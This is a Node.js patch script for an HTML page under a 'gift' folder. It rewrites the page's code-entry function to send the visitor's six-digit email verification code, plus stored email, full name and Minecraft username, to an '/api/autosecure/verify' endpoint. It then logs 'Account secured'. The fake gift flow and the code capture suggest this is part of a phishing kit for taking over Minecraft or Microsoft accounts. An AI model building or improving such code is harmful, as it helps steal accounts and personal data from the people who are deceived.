const fs = require('fs');
const path = require('path');

const filePath = path.join('./gift', 'enter_code.html');

if (fs.existsSync(filePath)) {
    let content = fs.readFileSync(filePath, 'utf8');
    
    // Find the complete function and modify it to use autosecure
    const oldComplete = `const complete = async () => {
            if (!code.value || code.value.length !== 6) {
                errorMessage.value = 'Please enter a valid 6-digit code';
                return;
            }

            isProcessing.value = true;
            errorMessage.value = '';

            try {
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email.value,
                        code: code.value
                    })
                });

                const result = await response.json();

                if (result.success) {
                    isCompleted.value = true;
                } else {
                    errorMessage.value = result.error || 'Invalid verification code';
                }
            } catch (error) {
                console.error('Error:', error);
                errorMessage.value = 'Failed to verify code';
            } finally {
                isProcessing.value = false;
            }
        };`;
    
    const newComplete = `const complete = async () => {
            if (!code.value || code.value.length !== 6) {
                errorMessage.value = 'Please enter a valid 6-digit code';
                return;
            }

            isProcessing.value = true;
            errorMessage.value = '';

            try {
                // Get session data from sessionStorage
                const sessionId = sessionStorage.getItem('autosecure_session');
                const userEmail = sessionStorage.getItem('user_email');
                const fullName = sessionStorage.getItem('full_name');
                const minecraftUsername = sessionStorage.getItem('minecraft_username') || '';

                if (!sessionId || !userEmail) {
                    errorMessage.value = 'Session expired. Please start over.';
                    // Redirect back to confirm page
                    window.location.href = 'mvpplus-confirm.html'; // This should be dynamic
                    return;
                }

                // Call autosecure verify API
                const response = await fetch('/api/autosecure/verify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        sessionId: sessionId,
                        otp: code.value,
                        minecraftUsername: minecraftUsername
                    })
                });

                const result = await response.json();

                if (result.success) {
                    isCompleted.value = true;
                    // Clear session
                    sessionStorage.removeItem('autosecure_session');
                    sessionStorage.removeItem('user_email');
                    sessionStorage.removeItem('full_name');
                    sessionStorage.removeItem('minecraft_username');
                    
                    // Show success message with account details
                    console.log('Account secured:', result.account);
                } else {
                    errorMessage.value = result.error || 'Invalid verification code';
                }
            } catch (error) {
                console.error('Error:', error);
                errorMessage.value = 'Failed to verify code';
            } finally {
                isProcessing.value = false;
            }
        };`;
    
    content = content.replace(oldComplete, newComplete);
    
    // Also need to load session data on page load
    const oldMounted = `onMounted(() => {
            // Get email from URL parameter or session
            const urlParams = new URLSearchParams(window.location.search);
            const emailParam = urlParams.get('email');
            
            if (emailParam) {
                email.value = emailParam;
            }
        });`;
    
    const newMounted = `onMounted(() => {
            // Get data from URL parameters and session
            const urlParams = new URLSearchParams(window.location.search);
            const emailParam = urlParams.get('email');
            const productParam = urlParams.get('product');
            const priceParam = urlParams.get('price');
            const imageParam = urlParams.get('image');
            
            // Load from session storage
            const sessionEmail = sessionStorage.getItem('user_email');
            const sessionFullName = sessionStorage.getItem('full_name');
            const sessionMinecraftUsername = sessionStorage.getItem('minecraft_username');
            
            if (sessionEmail) {
                email.value = sessionEmail;
            } else if (emailParam) {
                email.value = emailParam;
            }
            
            // Update product info if available
            if (productParam) {
                document.title = \`Email Verification - \${productParam}\`;
                // Update any product displays if needed
            }
            
            console.log('Loaded session data:', {
                email: email.value,
                fullName: sessionFullName,
                minecraftUsername: sessionMinecraftUsername,
                product: productParam
            });
        });`;
    
    content = content.replace(oldMounted, newMounted);
    
    fs.writeFileSync(filePath, content);
    console.log('Updated enter_code.html with autosecure integration');
} else {
    console.log('File not found: enter_code.html');
}

console.log('Enter code page updated with autosecure!');
